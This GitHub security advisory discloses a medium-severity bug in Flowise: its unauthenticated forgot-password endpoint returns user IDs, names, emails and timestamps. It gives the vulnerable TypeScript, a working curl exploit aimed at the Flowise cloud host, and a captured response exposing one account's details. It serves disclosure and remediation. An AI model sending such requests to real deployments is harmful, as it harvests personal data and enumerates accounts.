# [M] Flowise Vulnerable to PII Disclosure on Unauthenticated Forgot Password Endpoint

## Summary
Severity: Medium
Advisory: GHSA-jc5m-wrp2-qq38
CWE: CWE-200
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-jc5m-wrp2-qq38
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.0.13

## Details
## Summary

The `/api/v1/account/forgot-password` endpoint returns the full user object including PII (id, name, email, status, timestamps) in the response body instead of a generic success message. This exposes sensitive user information to unauthenticated attackers who only need to know a valid email address.

## Vulnerability Details

| Field | Value |
|-------|-------|
| CWE | CWE-200: Exposure of Sensitive Information to an Unauthorized Actor |
| Affected File | `packages/server/src/enterprise/services/account.service.ts` (lines 517-545) |
| Endpoint | `POST /api/v1/account/forgot-password` |
| Authentication | None required |
| CVSS 3.1 | 3.7 (Low) |

## Root Cause

In `account.service.ts`, the `forgotPassword` method returns the sanitized user object instead of a simple success acknowledgment:

```typescript
public async forgotPassword(data: AccountDTO) {
    // ...
    const user = await this.userService.readUserByEmail(data.user.email, queryRunner)
    if (!user) throw new InternalFlowiseError(StatusCodes.NOT_FOUND, UserErrorMessage.USER_NOT_FOUND)

    data.user = user
    // ... password reset logic ...

    return sanitizeUser(data.user)  // Returns user object with PII
}
```

The `sanitizeUser` function only removes sensitive authentication fields:

```typescript
export function sanitizeUser(user: Partial<User>) {
    delete user.credential    // password hash
    delete user.tempToken     // reset token
    delete user.tokenExpiry

    return user  // Still contains: id, name, email, status, createdDate, updatedDate
}
```

## Impact

An unauthenticated attacker can:

1. **Harvest PII**: Collect user IDs, full names, and account metadata
2. **Profile users**: Determine account creation dates and activity patterns
3. **Enumerate accounts**: Confirm email existence and gather associated data
4. **Enable further attacks**: Use harvested data for social engineering or targeted phishing

## Exploitation

```bash
curl -X POST "https://cloud.flowiseai.com/api/v1/account/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"victim@example.com"}}'
```

### Evidence

**Request:**
```http
POST /api/v1/account/forgot-password HTTP/1.1
Host: cloud.flowiseai.com
Content-Type: application/json

{"user":{"email":"vefag54010@naprb.com"}}
```

**Response (201 Created):**
```json
{
    "id": "56c3fc72-4e85-49c9-a4b5-d1a46b373a12",
    "name": "Vefag naprb",
    "email": "vefag54010@naprb.com",
    "status": "active",
    "createdDate": "2026-01-17T15:21:59.152Z",
    "updatedDate": "2026-01-17T15:35:06.492Z",
    "createdBy": "56c3fc72-4e85-49c9-a4b5-d1a46b373a12",
    "updatedBy": "56c3fc72-4e85-49c9-a4b5-d1a46b373a12"
}
```

<img width="1582" height="791" alt="screenshot" src="https://github.com/user-attachments/assets/9880f037-6e21-41d7-a7c8-7057c6775b50" />

## Exposed Data

| Field | Risk |
|-------|------|
| `id` | Internal user UUID - enables targeted attacks |
| `name` | Full name - PII disclosure |
| `email` | Email confirmation |
| `status` | Account state information |
| `createdDate` | User profiling |
| `updatedDate` | Activity tracking |
| `createdBy` / `updatedBy` | Internal reference leak |

## Expected Behavior

A secure forgot-password endpoint should return a generic response regardless of whether the email exists:

```json
{"message": "If this email exists, a password reset link has been sent."}
```

## References

- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#password-recovery)

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-jc5m-wrp2-qq38
- https://github.com/FlowiseAI/Flowise
